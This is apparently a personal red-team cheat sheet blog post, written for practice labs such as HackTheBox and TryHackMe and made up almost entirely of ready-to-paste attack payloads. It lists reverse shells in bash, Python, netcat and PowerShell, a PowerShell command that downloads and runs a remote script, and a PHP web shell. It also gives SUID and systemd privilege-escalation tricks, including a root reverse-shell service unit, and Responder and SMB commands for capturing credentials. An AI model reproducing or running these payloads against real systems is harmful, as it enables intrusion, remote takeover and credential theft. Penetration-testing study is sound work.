---
title: "My note for quick to use"
author: F4c3l3ss_
date: 2021-09-26
categories: [Note, OSCP, RedTeam]
Tags: [note, oscp, redteam, shell]
---
My note for quick to use in HackTheBox, TryHackme, VulnBox,...

## Reverse shell
### Bash

```bash
$ bash -i >& /dev/tcp/10.0.0.1/9001 0>&1

$ 0<&196;exec 196<>/dev/tcp/10.0.0.1/9001; sh <&196 >&196 2>&196

$ /bin/bash -l > /dev/tcp/10.0.0.1/9001 0<&1 2>&1
```

### Python

```bash
$ export RHOST="10.0.0.1";export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

$ python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",9001));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

### Netcat

```bash
$ nc -e /bin/sh 10.0.0.1 9001
$ nc -e /bin/bash 10.0.0.1 9001
$ nc -c bash 10.0.0.1 9001
```

```powershell
nc -e powershell 10.0.0.1 9001
```

### Powershell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```

```bash
ls /usr/share/nishang/Shells/
```

Create shell:

[https://www.revshells.com/](https://www.revshells.com/)

## RCE
### PHP

```php
<?php system($_REQUEST['Command:']); ?>
```

## Call shell
### Python

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
```
## SETUID

### Check SETUID
```bash
$ find / -user root -perm 4000 -print 2>/dev/null
```

### SETUID

```bash
chmod +s /bin/bash
$ bash -p
```

### systemctl
```
[Unit]
Description=Run arbibtrary command as root

[Service]
Type=oneshot
ExecStart=id

[Install]
WantedBy=multi-user.target
```

```
[Unit]
Description=Black magic happening, avert your eyes

[Service]
RemainAfterExit=yes
Type=simple
ExecStart=/bin/bash -c "exec 5<>/dev/tcp/10.10.100.123/31337; cat <&5 | while read line; do $line 2>&5 >&5; done"

[Install]
WantedBy=default.target
```

```
[Unit]
Description=Root reverse shell

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/9001 0>&1'

[Install]
WantedBy=multi-user.target
```

## Make resond
### Responder

```bash
$ responder -I eth0
```

### SMB server

```bash
$ impacket-smbser -smb2support Bear $(pwd)
```
